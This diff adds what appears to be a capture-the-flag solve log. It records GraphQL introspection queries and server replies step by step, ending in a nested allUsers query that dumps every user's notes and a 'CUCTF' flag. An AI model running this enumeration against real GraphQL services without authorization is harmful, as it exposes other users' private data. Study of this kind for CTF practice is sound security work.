@@ -1,0 +1,280 @@
+query={
+  __schema {
+    types {
+      name
+    }
+  }
+}
+
+{"data":{"__schema":{"types":[{"name":"Query"},{"name":"Node"},{"name":"ID"},{"name":"UserObjectConnection"},{"name":"PageInfo"},{"name":"Boolean"},{"name":"String"},{"name":"UserObjectEdge"},{"name":"UserObject"},{"name":"NoteObjectConnection"},{"name":"NoteObjectEdge"},{"name":"NoteObject"},{"name":"Int"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
+
+query={
+  __schema {
+    queryType {
+      fields {
+        name
+        description
+      }
+    }
+  }
+}
+
+{"data":{"__schema":{"queryType":{"fields":[{"name":"node","description":"The ID of the object"},{"name":"allUsers","description":null},{"name":"coolNotes","description":null}]}}}}
+
+query={
+	allUsers
+}
+
+{"errors":[{"message":"Field \"allUsers\" of type \"UserObjectConnection\" must have a sub selection.","locations":[{"line":2,"column":2}]}]}
+
+query={
+  __type(name: "UserObjectConnection") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+
+{"data":{"__type":{"name":"UserObjectConnection","fields":[{"name":"pageInfo","type":{"name":null,"kind":"NON_NULL"}},{"name":"edges","type":{"name":null,"kind":"NON_NULL"}}]}}}
+
+query={
+	allUsers{
+		pageInfo
+		edges
+	}
+}
+
+{"errors":[{"message":"Field \"pageInfo\" of type \"PageInfo!\" must have a sub selection.","locations":[{"line":3,"column":3}]},{"message":"Field \"edges\" of type \"[UserObjectEdge]!\" must have a sub selection.","locations":[{"line":4,"column":3}]}]}
+
+query={
+  __type(name: "PageInfo") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+
+{"data":{"__type":{"name":"PageInfo","fields":[{"name":"hasNextPage","type":{"name":null,"kind":"NON_NULL"}},{"name":"hasPreviousPage","type":{"name":null,"kind":"NON_NULL"}},{"name":"startCursor","type":{"name":"String","kind":"SCALAR"}},{"name":"endCursor","type":{"name":"String","kind":"SCALAR"}}]}}}
+
+query={
+  __type(name: "UserObjectEdge") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+
+{"data":{"__type":{"name":"UserObjectEdge","fields":[{"name":"node","type":{"name":"UserObject","kind":"OBJECT"}},{"name":"cursor","type":{"name":null,"kind":"NON_NULL"}}]}}}
+
+
+query={
+	allUsers {
+		pageInfo {
+			hasNextPage
+			hasPreviousPage
+			startCursor
+			endCursor
+		}
+		edges {
+			node
+			cursor
+		}
+	}
+}
+
+{"errors":[{"message":"Field \"node\" of type \"UserObject\" must have a sub selection.","locations":[{"line":10,"column":4}]}]}
+
+query={
+  __type(name: "UserObject") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+
+{"data":{"__type":{"name":"UserObject","fields":[{"name":"uuid","type":{"name":null,"kind":"NON_NULL"}},{"name":"username","type":{"name":"String","kind":"SCALAR"}},{"name":"notes","type":{"name":"NoteObjectConnection","kind":"OBJECT"}},{"name":"id","type":{"name":null,"kind":"NON_NULL"}}]}}}
+
+query={
+	allUsers {
+		pageInfo {
+			hasNextPage
+			hasPreviousPage
+			startCursor
+			endCursor
+		}
+		edges {
+			node {
+				uuid
+				username
+				notes
+				id
+			}
+			cursor
+		}
+	}
+}
+
+{"errors":[{"message":"Field \"notes\" of type \"NoteObjectConnection\" must have a sub selection.","locations":[{"line":13,"column":5}]}]}
+
+query={
+  __type(name: "NoteObjectConnection") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+
+{"data":{"__type":{"name":"NoteObjectConnection","fields":[{"name":"pageInfo","type":{"name":null,"kind":"NON_NULL"}},{"name":"edges","type":{"name":null,"kind":"NON_NULL"}}]}}}
+
+query={
+	allUsers {
+		pageInfo {
+			hasNextPage
+			hasPreviousPage
+			startCursor
+			endCursor
+		}
+		edges {
+			cursor
+			node {
+				uuid
+				username
+				id
+				notes {
+					pageInfo
+					edges
+				}
+			}
+		}
+	}
+}
+
+{"errors":[{"message":"Field \"pageInfo\" of type \"PageInfo!\" must have a sub selection.","locations":[{"line":16,"column":6}]},{"message":"Field \"edges\" of type \"[NoteObjectEdge]!\" must have a sub selection.","locations":[{"line":17,"column":6}]}]}
+
+query={
+  __type(name: "NoteObjectEdge") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+
+{"data":{"__type":{"name":"NoteObjectEdge","fields":[{"name":"node","type":{"name":"NoteObject","kind":"OBJECT"}},{"name":"cursor","type":{"name":null,"kind":"NON_NULL"}}]}}}
+
+query={
+	allUsers {
+		pageInfo {
+			hasNextPage
+			hasPreviousPage
+			startCursor
+			endCursor
+		}
+		edges {
+			cursor
+			node {
+				uuid
+				username
+				id
+				notes {
+					pageInfo {
+						hasNextPage
+						hasPreviousPage
+						startCursor
+						endCursor
+					}
+					edges {
+						node
+						cursor
+					}
+				}
+			}
+		}
+	}
+}
+
+{"errors":[{"message":"Field \"node\" of type \"NoteObject\" must have a sub selection.","locations":[{"line":23,"column":7}]}]}
+
+query={
+  __type(name: "NoteObject") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+
+{"data":{"__type":{"name":"NoteObject","fields":[{"name":"uuid","type":{"name":null,"kind":"NON_NULL"}},{"name":"title","type":{"name":"String","kind":"SCALAR"}},{"name":"body","type":{"name":"String","kind":"SCALAR"}},{"name":"authorId","type":{"name":"Int","kind":"SCALAR"}},{"name":"author","type":{"name":"UserObject","kind":"OBJECT"}},{"name":"id","type":{"name":null,"kind":"NON_NULL"}}]}}}
+
+query={
+	allUsers {
+		pageInfo {
+			hasNextPage
+			hasPreviousPage
+			startCursor
+			endCursor
+		}
+		edges {
+			cursor
+			node {
+				uuid
+				username
+				id
+				notes {
+					pageInfo {
+						hasNextPage
+						hasPreviousPage
+						startCursor
+						endCursor
+					}
+					edges {
+						cursor
+						node {
+							uuid
+							title
+							body
+							authorId
+							id
+						}
+					}
+				}
+			}
+		}
+	}
+}
+
+
+CUCTF{graphql_d3f1n1tely_1s_the_futur30985}
